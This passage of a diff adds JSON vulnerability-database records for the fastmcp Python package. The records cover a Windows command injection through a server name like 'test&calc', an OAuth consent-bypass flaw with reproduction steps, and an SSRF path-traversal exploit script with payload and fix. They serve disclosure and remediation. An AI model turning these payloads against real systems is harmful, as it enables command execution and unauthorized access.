+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5",
+        "2.13.0.2",
+        "2.13.1",
+        "2.13.2",
+        "2.13.3"
+      ]
+    },
+    {
+      "id": "GHSA-rj5c-58rq-j5g5",
+      "primary_id": "CVE-2025-62801",
+      "aliases": [
+        "CVE-2025-62801"
+      ],
+      "cve_ids": [
+        "CVE-2025-62801"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fastmcp",
+      "summary": "FastMCP vulnerable to windows command injection in FastMCP Cursor installer via server_name",
+      "details": "### Summary\nA command-injection vulnerability lets any attacker who can influence the server_name field of an MCP execute arbitrary OS commands on Windows hosts that run fastmcp install cursor\n\n### Details\n1. generate_cursor_deeplink(server_name, \u2026) embeds server_name verbatim in a cursor://\u2026?name= query string.\n2. open_deeplink() is invoked with shell=True only on Windows. That calls cmd.exe /c start <deeplink>.\n3. Any cmd metacharacter inside server_name (&, |, >, ^, \u2026) escapes the start command and spawns an attacker-chosen process.\n\n### PoC\nserver.py \n```\n\nimport random\nfrom fastmcp import FastMCP\n\nmcp = FastMCP(name=\"test&calc\")\n\n@mcp.tool\ndef roll_dice(n_dice: int) -> list[int]:\n    \"\"\"Roll `n_dice` 6-sided dice and return the results.\"\"\"\n    return [random.randint(1, 6) for _ in range(n_dice)]\n\nif __name__ == \"__main__\":\n    mcp.run()\n```\n\nthen run in the terminal:\n`fastmcp install cursor server.py`\n\n### Impact\nOS Command / Shell Injection (CWE-78)\nEvery Windows host that runs fastmcp install cursor is at risk. Developers on their local workstations, CI/CD agents and corporate build machines alike.",
+      "published": "2025-10-29T15:39:03Z",
+      "modified": "2025-10-29T15:52:48.354703Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jlowin/fastmcp/security/advisories/GHSA-rj5c-58rq-j5g5"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-62801"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jlowin/fastmcp"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-rj5c-58rq-j5g5",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.13.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.2.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.4.0",
+        "0.4.1",
+        "1.0",
+        "2.0.0",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2",
+        "2.10.0",
+        "2.10.1",
+        "2.10.2",
+        "2.10.3",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.0rc1",
+        "2.12.1",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5",
+        "2.13.0rc1",
+        "2.13.0rc2",
+        "2.13.0rc3",
+        "2.2.0",
+        "2.2.1",
+        "2.2.10",
+        "2.2.2",
+        "2.2.3",
+        "2.2.4",
+        "2.2.5",
+        "2.2.6",
+        "2.2.7",
+        "2.2.8",
+        "2.2.9",
+        "2.3.0",
+        "2.3.0rc1",
+        "2.3.1",
+        "2.3.2",
+        "2.3.3",
+        "2.3.4",
+        "2.3.5",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.6.0",
+        "2.6.1",
+        "2.7.0",
+        "2.7.1",
+        "2.8.0",
+        "2.8.1",
+        "2.9.0",
+        "2.9.1",
+        "2.9.2"
+      ],
+      "affected_conda_versions": [
+        "2.3.4",
+        "2.8.1",
+        "2.9.0",
+        "2.9.2",
+        "2.10.1",
+        "2.10.2",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5"
+      ]
+    },
+    {
+      "id": "GHSA-rww4-4w9c-7733",
+      "primary_id": "CVE-2026-27124",
+      "aliases": [
+        "CVE-2026-27124"
+      ],
+      "cve_ids": [
+        "CVE-2026-27124"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fastmcp",
+      "summary": "FastMCP: Missing Consent Verification in OAuth Proxy Callback Facilitates Confused Deputy Vulnerabilities",
+      "details": "## Summary\nWhile testing the *GitHubProvider* OAuth integration, which allows authentication to a FastMCP MCP server via a FastMCP OAuthProxy using GitHub OAuth, it was discovered that the FastMCP OAuthProxy does not properly validate the user's consent upon receiving the authorization code from GitHub. In combination with GitHub\u2019s behavior of skipping the consent page for previously authorized clients, this introduces a Confused Deputy vulnerability.\n\n## Technical Details\nAn adversary can initiate an authentication flow by connecting their malicious MCP client to a benign MCP server using the *GitHubProvider* OAuth integration. During this flow, the attacker consents to connect their client to the MCP server and, at that point, can capture the GitHub authorization URL they are redirected to after granting consent. The attacker can then lure a victim, who is already logged into GitHub and has previously connected an MCP client to the benign MCP server, to open this captured URL. As a result, the victim\u2019s browser is immediately redirected to the OAuthProxy\u2019s callback endpoint, which does not correctly enforce that this browser has just given consent. The OAuthProxy then redirects the victim\u2019s browser to the malicious MCP client\u2019s callback URL with a valid authorization code. The attacker can exchange this code for an access token to the benign MCP server associated with the victim\u2019s GitHub account, potentially gaining unauthorized access to resources tied to that account.\n\nAlthough this issue was verified in practice only for the *GitHubProvider*, a review of the source code, specifically the `OAuthProxy._handle_idp_callback` [function](https://github.com/jlowin/fastmcp/blob/ee5f465a82350e1c5a56c4a2b47cfdc4cd736e76/src/fastmcp/server/auth/oauth_proxy.py#L1762), shows that the IdP callback handler does not verify whether the browser sending the `state` and `code` has previously consented to connecting the client to the server. As long as a valid `state` and `code` pair is provided, the OAuthProxy requests an access token from the IdP and then redirects the user-agent to the client\u2019s callback URL with a new `code` and the corresponding `state`, allowing the client to retrieve the access token from the proxy. This pattern causes all OAuth integrations whose IdP allows skipping the consent page to be vulnerable to this attack.\n\nSkipping the consent page is not, by itself, a vulnerability on the IdP side. Many providers legitimately skip consent for first-party or previously authorized clients with the same scopes. In this case, the core problem lies in the OAuthProxy callback handler not correctly verifying that the browser issuing the callback request is the same one that has just given the required consent.\n\n## Steps to reproduce\n1. Set up an MCP server using the *GitHubProvider* integration.\n2. Connect a benign MCP client to this MCP server.\n3. Configure your default browser to route all traffic through an interception proxy such as Burp Suite.\n4. In a private browsing window or a second browser, log into the GitHub account used in step 2.\n5. As the attacker, connect a new (malicious) MCP client to the MCP server from step 1.\n6. When the browser opens for the attacker\u2019s client, enable interception in your proxy.\n7. In the browser, confirm the consent prompt.\n8. In the proxy, forward all requests up to the authorization request to the GitHub authorization server.\n9. Copy the authorization URL and drop the intercepted request.\n10. Simulate luring the victim onto the URL by opening this URL in the browser window opened in step 4.\n11. Observe that the malicious client receives a valid authorization code and gains access to the benign MCP server using the victim\u2019s GitHub account.\n\nIn a more realistic scenario, the malicious client could be a public MCP client or a simple web server that logs the received authorization code or token, which the attacker then uses to obtain the access token and connect to the MCP server as the victim.\n\n## Recommendation\n\nTo mitigate this issue, the OAuthProxy should verify that the browser sending the authorization code has actually given consent for the corresponding client. This can be achieved by setting and validating a consent cookie or similar browser-bound state, as described in the [mitigations section](https://mcp.mintlify.app/specification/2025-11-25/basic/security_best_practices#mitigation) for this vulnerability in the MCP specification.",
+      "published": "2026-03-31T22:32:28Z",
+      "modified": "2026-04-06T17:56:18.307596Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/PrefectHQ/fastmcp/security/advisories/GHSA-rww4-4w9c-7733"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jlowin/fastmcp/security/advisories/GHSA-rww4-4w9c-7733"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27124"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/PrefectHQ/fastmcp"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-rww4-4w9c-7733",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.2.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.2.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.4.0",
+        "0.4.1",
+        "1.0",
+        "2.0.0",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2",
+        "2.10.0",
+        "2.10.1",
+        "2.10.2",
+        "2.10.3",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.0rc1",
+        "2.12.1",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5",
+        "2.13.0",
+        "2.13.0.1",
+        "2.13.0.2",
+        "2.13.0rc1",
+        "2.13.0rc2",
+        "2.13.0rc3",
+        "2.13.1",
+        "2.13.2",
+        "2.13.3",
+        "2.14.0",
+        "2.14.1",
+        "2.14.2",
+        "2.14.3",
+        "2.14.4",
+        "2.14.5",
+        "2.14.6",
+        "2.2.0",
+        "2.2.1",
+        "2.2.10",
+        "2.2.2",
+        "2.2.3",
+        "2.2.4",
+        "2.2.5",
+        "2.2.6",
+        "2.2.7",
+        "2.2.8",
+        "2.2.9",
+        "2.3.0",
+        "2.3.0rc1",
+        "2.3.1",
+        "2.3.2",
+        "2.3.3",
+        "2.3.4",
+        "2.3.5",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.6.0",
+        "2.6.1",
+        "2.7.0",
+        "2.7.1",
+        "2.8.0",
+        "2.8.1",
+        "2.9.0",
+        "2.9.1",
+        "2.9.2",
+        "3.0.0",
+        "3.0.0b1",
+        "3.0.0b2",
+        "3.0.0rc1",
+        "3.0.0rc2",
+        "3.0.0rc3",
+        "3.0.1",
+        "3.0.2",
+        "3.1.0",
+        "3.1.1"
+      ],
+      "affected_conda_versions": [
+        "2.3.4",
+        "2.8.1",
+        "2.9.0",
+        "2.9.2",
+        "2.10.1",
+        "2.10.2",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5",
+        "2.13.0.2",
+        "2.13.1",
+        "2.13.2",
+        "2.13.3",
+        "2.14.0",
+        "2.14.1",
+        "2.14.2",
+        "2.14.3",
+        "3.0.2",
+        "3.1.0"
+      ]
+    },
+    {
+      "id": "GHSA-vv7q-7jx5-f767",
+      "primary_id": "CVE-2026-32871",
+      "aliases": [
+        "CVE-2026-32871"
+      ],
+      "cve_ids": [
+        "CVE-2026-32871"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fastmcp",
+      "summary": "FastMCP OpenAPI Provider has an SSRF & Path Traversal Vulnerability",
+      "details": "## Technical Description\n\nThe `OpenAPIProvider` in FastMCP exposes internal APIs to MCP clients by parsing OpenAPI specifications. The `RequestDirector` class is responsible for constructing HTTP requests to the backend service.\n\nA critical vulnerability exists in the `_build_url()` method. When an OpenAPI operation defines path parameters (e.g., `/api/v1/users/{user_id}`), the system directly substitutes parameter values into the URL template string **without URL-encoding**. Subsequently, `urllib.parse.urljoin()` resolves the final URL.\n\nSince `urljoin()` interprets `../` sequences as directory traversal, an attacker controlling a path parameter can perform path traversal attacks to escape the intended API prefix and access arbitrary backend endpoints. This results in **authenticated SSRF**, as requests are sent with the authorization headers configured in the MCP provider.\n\n---\n\n## Vulnerable Code\n\n**File:** `fastmcp/utilities/openapi/director.py`\n\n```python\ndef _build_url(\n    self, path_template: str, path_params: dict[str, Any], base_url: str\n) -> str:\n    # Direct string substitution without encoding\n    url_path = path_template\n    for param_name, param_value in path_params.items():\n        placeholder = f\"{{{param_name}}}\"\n        if placeholder in url_path:\n            url_path = url_path.replace(placeholder, str(param_value))\n\n    # urljoin resolves ../ escape sequences\n    return urljoin(base_url.rstrip(\"/\") + \"/\", url_path.lstrip(\"/\"))\n```\n\n### Root Cause\n\n1. Path parameters are substituted directly without URL encoding\n2. `urllib.parse.urljoin()` interprets `../` as directory traversal\n3. No validation prevents traversal sequences in parameter values\n4. Requests inherit the authentication context of the MCP provider\n\n---\n\n## Proof of Concept\n\n### Step 1: Backend API Setup\n\nCreate `internal_api.py` to simulate a vulnerable backend server:\n\n```python\nfrom fastapi import FastAPI, Header, HTTPException\nimport uvicorn\n\napp = FastAPI()\n\n@app.get(\"/api/v1/users/{user_id}/profile\")\ndef get_profile(user_id: str):\n    return {\"status\": \"success\", \"user\": user_id}\n\n@app.get(\"/admin/delete-all\")\ndef admin_endpoint(authorization: str = Header(None)):\n    if authorization == \"Bearer admin_secret\":\n        return {\"status\": \"CRITICAL\", \"message\": \"Administrative access granted\"}\n    raise HTTPException(status_code=401)\n\nif __name__ == \"__main__\":\n    uvicorn.run(app, host=\"127.0.0.1\", port=8080)\n```\n\n### Step 2: Exploitation Script\n\nCreate `exploit_poc.py`:\n\n```python\nimport asyncio\nimport httpx\nfrom fastmcp.utilities.openapi.director import RequestDirector\n\nasync def exploit_ssrf():\n    # Initialize vulnerable component\n    director = RequestDirector(spec={})\n    base_url = \"http://127.0.0.1:8080/\"\n    template = \"/api/v1/users/{id}/profile\"\n    \n    # Payload: Path traversal to reach /admin/delete-all\n    # The '?' character neutralizes the rest of the original template\n    payload = \"../../../admin/delete-all?\"\n    \n    # Construct malicious URL\n    malicious_url = director._build_url(template, {\"id\": payload}, base_url)\n    print(f\"[*] Generated URL: {malicious_url}\")\n\n    async with httpx.AsyncClient() as client:\n        # Request inherits MCP provider's authorization headers\n        response = await client.get(\n            malicious_url, \n            headers={\"Authorization\": \"Bearer admin_secret\"}\n        )\n        print(f\"[+] Status Code: {response.status_code}\")\n        print(f\"[+] Response: {response.text}\")\n\nif __name__ == \"__main__\":\n    asyncio.run(exploit_ssrf())\n```\n\n### Expected Output\n\n```\n[*] Generated URL: http://127.0.0.1:8080/admin/delete-all?\n[+] Status Code: 200\n[+] Response: {\"status\": \"CRITICAL\", \"message\": \"Administrative access granted\"}\n```\n\nThe attacker successfully accessed an endpoint not defined in the OpenAPI specification using the MCP provider's authentication credentials.\n\n---\n\n## Impact Assessment\n\n### Severity Justification\n\n- **Unauthorized Access**: Attackers can interact with private endpoints not exposed in the OpenAPI specification\n- **Privilege Escalation**: The attacker operates within the MCP provider's security context and credentials\n- **Authentication Bypass**: The primary security control of OpenAPIProvider (restricting access to safe functions) is completely circumvented\n- **Data Exfiltration**: Sensitive internal APIs can be accessed and exploited\n- **Lateral Movement**: Internal-only services may be compromised from the network boundary\n\n### Attack Scenarios\n\n1. **Accessing Admin Panels**: Bypass API restrictions to reach administrative endpoints\n2. **Data Theft**: Access internal databases or sensitive information endpoints\n3. **Service Disruption**: Trigger destructive operations on backend services\n4. **Credential Extraction**: Access endpoints returning API keys, tokens, or credentials\n\n---\n\n## Remediation\n\n### Recommended Fix\n\nURL-encode all path parameter values **before** substitution to ensure reserved characters (`/`, `.`, `?`, `#`) are treated as literal data, not path delimiters.\n\n**Updated code for `_build_url()` method:**\n\n```python\nimport urllib.parse\n\ndef _build_url(\n    self, path_template: str, path_params: dict[str, Any], base_url: str\n) -> str:\n    url_path = path_template\n    for param_name, param_value in path_params.items():\n        placeholder = f\"{{{param_name}}}\"\n        if placeholder in url_path:\n            # Apply safe URL encoding to prevent traversal attacks\n            # safe=\"\" ensures ALL special characters are encoded\n            safe_value = urllib.parse.quote(str(param_value), safe=\"\")\n            url_path = url_path.replace(placeholder, safe_value)\n\n    return urljoin(base_url.rstrip(\"/\") + \"/\", url_path.lstrip(\"/\"))\n```",
+      "published": "2026-03-31T22:53:21Z",
+      "modified": "2026-04-10T19:49:54.384033Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/PrefectHQ/fastmcp/security/advisories/GHSA-vv7q-7jx5-f767"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-32871"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/PrefectHQ/fastmcp/pull/3507"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/PrefectHQ/fastmcp/commit/40bdfb6b1de0ce30609ee9ba5bb95ecd04a9fb71"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/PrefectHQ/fastmcp"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/PrefectHQ/fastmcp/releases/tag/v3.2.0"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-vv7q-7jx5-f767",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.2.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.2.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.4.0",
+        "0.4.1",
+        "1.0",
+        "2.0.0",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2",
+        "2.10.0",
+        "2.10.1",
+        "2.10.2",
+        "2.10.3",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.0rc1",
+        "2.12.1",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5",
+        "2.13.0",
+        "2.13.0.1",
+        "2.13.0.2",
+        "2.13.0rc1",
+        "2.13.0rc2",
+        "2.13.0rc3",
+        "2.13.1",
+        "2.13.2",
+        "2.13.3",
+        "2.14.0",
+        "2.14.1",
+        "2.14.2",
+        "2.14.3",
+        "2.14.4",
+        "2.14.5",
+        "2.14.6",
+        "2.2.0",
+        "2.2.1",
+        "2.2.10",
+        "2.2.2",
+        "2.2.3",
+        "2.2.4",
+        "2.2.5",
+        "2.2.6",
+        "2.2.7",
+        "2.2.8",
+        "2.2.9",
+        "2.3.0",
+        "2.3.0rc1",
+        "2.3.1",
+        "2.3.2",
+        "2.3.3",
+        "2.3.4",
+        "2.3.5",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.6.0",
+        "2.6.1",
+        "2.7.0",
+        "2.7.1",
+        "2.8.0",
+        "2.8.1",
+        "2.9.0",
+        "2.9.1",
+        "2.9.2",
+        "3.0.0",
+        "3.0.0b1",
+        "3.0.0b2",
+        "3.0.0rc1",
+        "3.0.0rc2",
+        "3.0.0rc3",
+        "3.0.1",
+        "3.0.2",
+        "3.1.0",
+        "3.1.1"
+      ],
+      "affected_conda_versions": [
+        "2.3.4",
+        "2.8.1",
+        "2.9.0",
+        "2.9.2",
+        "2.10.1",
+        "2.10.2",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5",
+        "2.13.0.2",
+        "2.13.1",
+        "2.13.2",
+        "2.13.3",
+        "2.14.0",
+        "2.14.1",
+        "2.14.2",
+        "2.14.3",
+        "3.0.2",
+        "3.1.0"
+      ]
+    }
+  ]
+}
